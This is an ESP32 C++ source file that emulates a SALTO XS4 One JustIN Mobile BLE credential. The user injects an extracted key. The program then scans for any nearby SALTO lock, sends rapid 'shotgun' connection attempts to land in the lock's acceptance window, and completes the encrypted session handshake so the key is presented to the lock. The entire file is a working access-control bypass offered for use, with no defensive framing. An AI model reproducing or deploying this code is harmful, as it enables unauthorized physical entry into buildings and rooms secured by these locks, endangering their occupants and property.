/*
 * SALTO XS4 One (E1722) — JustIN Mobile BLE v0200 credential emulator
 * RAW PATH + SCAN-SYNC acquire: listen for the lock's advertisement, connect
 * the moment it appears; fall back to brief direct-connect attempts.
 */
#include <NimBLEDevice.h>
#include <mbedtls/aes.h>
#include <Arduino.h>
#include "nimble/nimble/host/include/host/ble_hs.h"
#include "nimble/nimble/host/include/host/ble_gap.h"

#define H_WRITE 0x000e   // B6E60003 write char (write-with-response)
#define H_READ  0x000b   // B6E60002 read/notify char
#define H_CCCD  0x000c   // CCCD of 0x000b

static const char* KN_HEX    = "00000000000000000000000000000000"; // <<< INJECT your extracted KN (32 hex chars)
static const char* LOCK_HEX  = "84:fd:27:2f:18:60"; // optional; generic scan ignores this
static const char* SALTO_SERVICE_UUID = "B6E60001-E2E3-BC82-4C72-929D0D29CA17";

static const uint8_t NEG_TAG1[80] = {
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

// ---------------------------------------------------------------------------
static mbedtls_aes_context aesCtx;
static void crcA(const uint8_t* d, size_t n, uint8_t out[2]) {
  uint32_t crc = 0x6363;
  for (size_t i = 0; i < n; i++) {
    uint8_t b = d[i];
    crc = (crc >> 4) ^ (((crc ^ b) & 0x0F) * 0x1081);
    crc = (crc >> 4) ^ ((((b >> 4) ^ crc) & 0x0F) * 0x1081);
  }
  out[0] = crc & 0xFF; out[1] = (crc >> 8) & 0xFF;
}
static void pad7816(std::vector<uint8_t>& in) {
  in.push_back(0x80);
  while (in.size() % 16) in.push_back(0x00);
}
static void aesCbc(uint8_t* in, size_t len, const uint8_t* key, uint8_t iv[16],
                   bool decrypt, uint8_t* out) {
  if (decrypt) mbedtls_aes_setkey_dec(&aesCtx, key, 128);
  else        mbedtls_aes_setkey_enc(&aesCtx, key, 128);
  if (decrypt) {
    uint8_t tmp[16];
    for (size_t off = 0; off < len; off += 16) {
      memcpy(tmp, in + off, 16);
      mbedtls_aes_crypt_ecb(&aesCtx, MBEDTLS_AES_DECRYPT, in + off, out + off);
      for (int i = 0; i < 16; i++) out[off + i] ^= iv[i];
      memcpy(iv, tmp, 16);
    }
  } else {
    for (size_t off = 0; off < len; off += 16) {
      for (int i = 0; i < 16; i++) out[off + i] = in[off + i] ^ iv[i];
      mbedtls_aes_crypt_ecb(&aesCtx, MBEDTLS_AES_ENCRYPT, out + off, out + off);
      memcpy(iv, out + off, 16);
    }
  }
}
static void rotR(const uint8_t in[16], uint8_t out[16]) {
  out[0] = in[15]; memcpy(out + 1, in, 15);
}
static size_t stripPad(const uint8_t* p, size_t n) {
  while (n > 0 && p[n-1] == 0) n--;
  if (n > 0 && p[n-1] == 0x80) n--;
  return n;
}

static uint8_t KN[16], iv[16], sessRandomB[16], sessRandomA[16], sessKey[16];
static bool inSession = false;

static void hexLog(const char* pre, const uint8_t* d, size_t n) {
  Serial.print(pre);
  for (size_t i = 0; i < n; i++) Serial.printf("%02x", d[i]);
  Serial.println();
}

static std::vector<uint8_t> wrap(const uint8_t* p, size_t plen,
                                 const uint8_t* key, uint8_t hdr) {
  std::vector<uint8_t> body(p, p + plen);
  uint8_t crc[2]; crcA(body.data(), body.size(), crc);
  body.insert(body.end(), crc, crc + 2);
  pad7816(body);
  uint8_t* ct = (uint8_t*)malloc(body.size());
  aesCbc(body.data(), body.size(), key, iv, false, ct);
  std::vector<uint8_t> out; out.push_back(hdr);
  out.insert(out.end(), ct, ct + body.size());
  free(ct);
  return out;
}

// ---------------------------------------------------------------------------
static bool justinHandle(const std::vector<uint8_t>& content,
                         std::vector<uint8_t>& reply) {
  if (content.empty()) return false;
  uint8_t cmd = content[0];
  switch (cmd) {
    case 0: reply = (content.size() >= 9) ? std::vector<uint8_t>{0x00}
                                          : std::vector<uint8_t>{0x01}; return true;
    case 1: reply = (content.size() == 2) ? std::vector<uint8_t>{0x00}
                                          : std::vector<uint8_t>{0x01}; return true;
    case 2: {
      if (content.size() != 2) { reply = {0x01}; return true; }
      uint8_t tag = content[1];
      if (tag == 0x01) { reply.push_back(0x00);
        reply.insert(reply.end(), NEG_TAG1, NEG_TAG1 + sizeof(NEG_TAG1));
      } else if (tag == 0x02) { reply.push_back(0x00);
        reply.insert(reply.end(), KN, KN + 16);
      } else reply = {0x02};
      return true;
    }
    case 3: {
      if (content.size() < 2) { reply = {0x01}; return true; }
      reply = {0x00};
      return true;
    }
  }
  return false;
}

// ---------------------------------------------------------------------------
static bool sspHandle(const uint8_t* in, size_t inLen, std::vector<uint8_t>& reply) {
  if (inLen < 1) return false;
  uint8_t wireHdr = in[0];
  bool encrypted = (wireHdr & 0x02) == 0x02;
  bool control   = (wireHdr & 0x01) == 0x01;
  std::vector<uint8_t> content;
  if (encrypted) {
    size_t ctLen = inLen - 1;
    if (ctLen == 0 || ctLen % 16) return false;
    uint8_t* pt = (uint8_t*)malloc(ctLen);
    if (!pt) return false;
    aesCbc((uint8_t*)in + 1, ctLen, inSession ? sessKey : KN, iv, true, pt);
    size_t pl = stripPad(pt, ctLen);
    pl -= 2;
    content.assign(pt, pt + pl);
    free(pt);
  } else {
    content.assign(in + 1, in + inLen);
  }

  if (!control) {
    std::vector<uint8_t> raw;
    if (!justinHandle(content, raw)) return false;
    if (inSession) reply = wrap(raw.data(), raw.size(), sessKey, wireHdr);
    else { reply.clear(); reply.push_back(wireHdr);
           reply.insert(reply.end(), raw.begin(), raw.end()); }
    return true;
  }

  uint8_t op = content[0];
  if (op == 1) {
    if (inSession) return false;
    for (int i = 0; i < 16; i++) sessRandomB[i] = esp_random() & 0xFF;
    memset(iv, 0, 16);
    uint8_t body[19]; body[0] = 1; memcpy(body + 1, sessRandomB, 16);
    uint8_t crc[2]; crcA(body, 17, crc); memcpy(body + 17, crc, 2);
    reply = wrap(body, 19, KN, 0x03);
    return true;
  }
  if (op == 2) {
    if (content.size() < 33) return false;
    memcpy(sessRandomA, content.data() + 1, 16);
    const uint8_t* bP = content.data() + 17;
    uint8_t br[16]; rotR(sessRandomB, br);
    if (memcmp(br, bP, 16)) { Serial.println("[SSP] rotR(B) MISMATCH"); return false; }
    uint8_t ra[16]; rotR(sessRandomA, ra);
    uint8_t body[19]; body[0] = 2; memcpy(body + 1, ra, 16);
    uint8_t crc[2]; crcA(body, 17, crc); memcpy(body + 17, crc, 2);
    reply = wrap(body, 19, KN, 0x03);
    memcpy(sessKey, sessRandomA, 4);
    memcpy(sessKey + 4, sessRandomB, 4);
    memcpy(sessKey + 8, sessRandomA + 12, 4);
    memcpy(sessKey + 12, sessRandomB + 12, 4);
    inSession = true;
    return true;
  }
  if (op == 4) { reply = {1, 4, 1, 2}; return true; }
  return false;
}

// ---------------------------------------------------------------------------
static uint16_t connHandle = 0xFFFF;
static uint32_t tConnected = 0;

static void sendReply(const std::vector<uint8_t>& r) {
  int rc = ble_gattc_write_flat(connHandle, H_WRITE, r.data(), r.size(), NULL, NULL);
  if (rc != 0) Serial.printf("  [write rc=%d]\n", rc);
}

static int gapCb(struct ble_gap_event* ev, void* arg) {
  switch (ev->type) {
    case BLE_GAP_EVENT_NOTIFY_RX: {
      uint16_t len = OS_MBUF_PKTLEN(ev->notify_rx.om);
      if (len > 256) len = 256;
      uint8_t buf[256];
      os_mbuf_copydata(ev->notify_rx.om, 0, len, buf);
      std::vector<uint8_t> reply;
      if (sspHandle(buf, len, reply)) sendReply(reply);
      return 0;
    }
    case BLE_GAP_EVENT_DISCONNECT:
      Serial.printf("[GAP] disconnected after %ums\n", (unsigned)(millis() - tConnected));
      return 0;
  }
  return 0;
}

static struct ble_gap_event_listener gapListener;
static bool listenerRegistered = false;

static int readCb(uint16_t c, const struct ble_gatt_error* err,
                  struct ble_gatt_attr* attr, void* arg) {
  return 0;
}

// ---------------------------------------------------------------------------
// SCAN-SYNC ACQUIRE
// ---------------------------------------------------------------------------
static NimBLEAddress lockAddr;
static bool lockSeen = false;

static NimBLEAddress seenAddr;

// Generic Salto matcher: manufacturer data starts with company id 99 01
// (the same fingerprint the app's AdvManufacturerData checks), or the
// advertising includes the B6E60001 service UUID.
static bool isSaltoAdv(const NimBLEAdvertisedDevice* adv) {
  if (adv->isAdvertisingService(NimBLEUUID(SALTO_SERVICE_UUID))) return true;
  const std::vector<uint8_t>& pl = adv->getPayload();
  size_t i = 0;
  while (i + 1 < pl.size()) {
    uint8_t len = pl[i];
    if (len == 0) break;
    if (i + 1 + len > pl.size()) break;
    uint8_t type = pl[i + 1];
    const uint8_t* d = pl.data() + i + 2;
    if (type == 0xFF && len >= 3 && d[0] == 0x99 && d[1] == 0x01) return true;
    if ((type == 0x07 || type == 0x06) && len >= 17) {
      // 128-bit UUID, reversed byte order: b6e60001-e2e3-bc82-4c72-929d0d29ca17
      static const uint8_t sig[16] = {0xb6,0xe6,0x00,0x01,0xe2,0xe3,0xbc,0x82,
                                      0x4c,0x72,0x92,0x9d,0x0d,0x29,0xca,0x17};
      bool ok = true;
      for (int k = 0; k < 16; k++) if (d[15-k] != sig[k]) { ok = false; break; }
      if (ok) return true;
    }
    i += 1 + len;
  }
  return false;
}

class AcquireCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* adv) override {
    if (isSaltoAdv(adv)) {
      Serial.printf("[SCAN] SALTO LOCK rssi=%d connectable=%d addr=%s t=%us\n",
                    adv->getRSSI(), adv->isConnectable(),
                    adv->getAddress().toString().c_str(),
                    (unsigned)(millis() / 1000));
      seenAddr = adv->getAddress();          // any Salto lock: capture & use
      lockSeen = true;
      NimBLEDevice::getScan()->stop();
    }
  }
};

// scan until the lock advertises (max seconds), then return true
static bool scanForLock(uint8_t maxSeconds) {
  Serial.printf("[*] listening for lock advert (%us max)...\n", maxSeconds);
  NimBLEScan* s = NimBLEDevice::getScan();
  s->setScanCallbacks(new AcquireCB);
  s->setActiveScan(true);
  s->setInterval(200);
  s->setWindow(150);
  lockSeen = false;
  uint32_t deadline = millis() + (uint32_t)maxSeconds * 1000;
  s->start(0, true);
  while (!lockSeen && millis() < deadline) delay(20);
  s->stop();
  NimBLEDevice::getScan()->clearResults();
  delay(500);               // fully settle the controller before connecting
  return lockSeen;
}

// ---------------------------------------------------------------------------
static bool tryConnect(NimBLEClient* cl, const NimBLEAddress& dst) {
  uint32_t t0 = millis();
  bool ok = cl->connect(dst);
  uint32_t dt = millis() - t0;
  int err = cl->getLastError();
  Serial.printf("  [CONN] %s after %ums (hostErr=%d rc=%d)\n",
                ok ? "ok" : "FAILED", (unsigned)dt, err, err == 0xffffffff ? -1 : err);
  return ok;
}

// ---------------------------------------------------------------------------
static bool runSession(NimBLEClient* cl) {
  tConnected = millis();
  connHandle = cl->getConnHandle();
  Serial.printf("  connected! t+%us\n", (unsigned)(tConnected / 1000));

  int rc = ble_gattc_exchange_mtu(connHandle, NULL, NULL);
  if (cl->updateConnParams(12, 12, 0, 600))
    Serial.println("  [CONN] high priority requested");

  static const uint8_t sel[] = {0xC0, 0x01, 0x01};
  uint8_t cccd[2] = {0x01, 0x00};
  rc = ble_gattc_write_flat(connHandle, H_WRITE, sel, 3, NULL, NULL);
  Serial.printf("[SEL] rc=%d @%ums\n", rc, (unsigned)(millis() - tConnected));
  rc = ble_gattc_read(connHandle, H_READ, readCb, NULL);
  Serial.printf("[READ] blob rc=%d @%ums\n", rc, (unsigned)(millis() - tConnected));
  rc = ble_gattc_write_flat(connHandle, H_CCCD, cccd, 2, NULL, NULL);
  Serial.printf("[CCCD] rc=%d @%ums\n", rc, (unsigned)(millis() - tConnected));

  Serial.println("[*] armed — awaiting SSP messages...");
  inSession = false;
  uint32_t sessStart = millis();
  while (cl->isConnected() && millis() - sessStart < 12000) {
    delay(25);
    if (inSession && (millis() - sessStart) > 8000) break; // session done
  }
  Serial.printf("== session end @%ums (inSession=%d) ==\n",
                (unsigned)(millis() - tConnected), inSession);
  inSession = false;
  return true;
}

// ---------------------------------------------------------------------------
void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== SALTO BLE v0200 PAGING build (no-scan) ===");

  size_t kl = strlen(KN_HEX);
  auto nib = [](char c)->uint8_t { if (c<='9') return c-'0'; c=tolower(c); return c-'a'+10; };
  for (int i = 0; i < 16; i++) KN[i] = (nib(KN_HEX[i*2]) << 4) | nib(KN_HEX[i*2+1]);

  uint8_t mac[6];
  sscanf(LOCK_HEX, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
  lockAddr = NimBLEAddress(mac, 0);

  NimBLEDevice::init("esp-re");
  NimBLEDevice::setMTU(256);
  if (!listenerRegistered) {
    gapListener = {};
    ble_gap_event_listener_register(&gapListener, gapCb, NULL);
    listenerRegistered = true;
  }

  static int cycle = 0;

  // SHOTGUN CONNECT: the lock only ACCEPTS connections during a short window
  // (most instants it rejects within ~10ms). So: scan to prime it, then
  // sample connect attempts at maximum density; a non-window rejection costs
  // ~10ms, so we get ~40 samples/sec and WILL land when the window opens.
  while (true) {
    bool seen = scanForLock(12);
    NimBLEAddress dst = seen ? seenAddr : NimBLEAddress(LOCK_HEX, 0);
    Serial.printf("[*] shotgun connect (seen=%d, t=%us)...\n",
                  seen, (unsigned)(millis() / 1000));

    bool opened = false;
    uint32_t burstEnd = millis() + 18000;         // sample up to 18 s
    uint32_t maxSlow = 0;
    while (millis() < burstEnd) {
      NimBLEClient* cl = NimBLEDevice::createClient();
      cl->setConnectionParams(24, 48, 0, 600);
      cl->setConnectTimeout(3);
      uint32_t t0 = millis();
      bool ok = cl->connect(dst);
      uint32_t dt = millis() - t0;
      if (dt > maxSlow) maxSlow = dt;
      if (ok) {
        Serial.printf("[CONN] ok after %ums (burst sample hit)\n", (unsigned)dt);
        runSession(cl);
        cl->disconnect();
        NimBLEDevice::deleteClient(cl);
        opened = true;
        break;
      }
      NimBLEDevice::deleteClient(cl);
      if (dt > 150 && dt < 2900)
        Serial.printf("[*]   slow reject %ums (window opening?)\n", (unsigned)dt);
      delay(15);                                  // tightest safe sampling gap
    }
    Serial.printf("[*] cycle %d done (opened=%d, slowest=%ums)\n",
                  ++cycle, opened, (unsigned)maxSlow);
    if (opened) { Serial.println("[*] cooldown 1500ms"); delay(1500); }
    else { Serial.println("[*] rebooting for clean state"); delay(300); ESP.restart(); }
  }
}

void loop() { delay(1000); }